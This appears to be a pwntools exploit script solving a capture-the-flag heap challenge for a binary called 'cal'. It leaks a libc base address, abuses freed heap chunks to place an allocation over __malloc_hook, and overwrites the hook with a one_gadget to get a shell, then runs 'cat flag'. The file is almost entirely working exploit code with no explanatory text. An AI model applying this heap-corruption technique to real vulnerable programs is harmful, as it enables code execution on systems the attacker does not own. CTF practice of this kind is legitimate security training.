from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./cal")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./cal")
else:
	p = remote(ip,port)
	libc = ELF("./libc.so.6")
	elf = ELF("./cal")

def line(info,size=False):
	p.sendlineafter("com:\n","1")
	p.sendafter("line\n",info)
	if size:
		p.sendlineafter("size:\n",str(size))
	

def index(index,new,delete):
	p.sendlineafter("com:\n","0")
	p.sendlineafter("index:\n",str(index))
	p.sendafter("new\n",new)
	p.sendafter("del:\n",delete)


code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1=hex(code_base+0x1BB8)))

#context.log_level = "debug"
#context.terminal = ["tmux","splitw","-v"]
#debugf()
line('0 = "aaaa"\n',0x100)
line('1 = "bbbb"\n',0x20)
line('0 = #\n')
line('0 = "aaaaaaaa"\n',0x100)
p.recvuntil("a"*8)
libc_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = libc_addr - libc.symbols["__malloc_hook"] - 0x10 - 88
log.success("libc_base:"+hex(libc.address))
size = 0x60
line('0 = #\n')
line('1 = #\n')
index(0,'1 = [0\n','\n')
line('0 = "aaaa"',size)
line('2 = "aaaa"',size)
line('1 = #\n')
line('2 = #\n')
line('3 = [0\n')
line('0 = #\n')
one_gadget = libc.address + 0x4526a
#debugf()
payload = p64(libc.symbols["__malloc_hook"] - 0x23)
line('0 = "{payload}"\n'.format(payload=payload),size)
line('1 = "a"\n',size)
line('2 = "b"\n',size)
payload = "a"* 3 + p64(0)*2 + p64(one_gadget)
line('3 = "{payload}"\n'.format(payload=payload),size)
line('4 = "aaaa"',0x20)
if debug:
	p.sendline("cat flag")
else:
	p.sendline("cat flag")
print p.recvline()
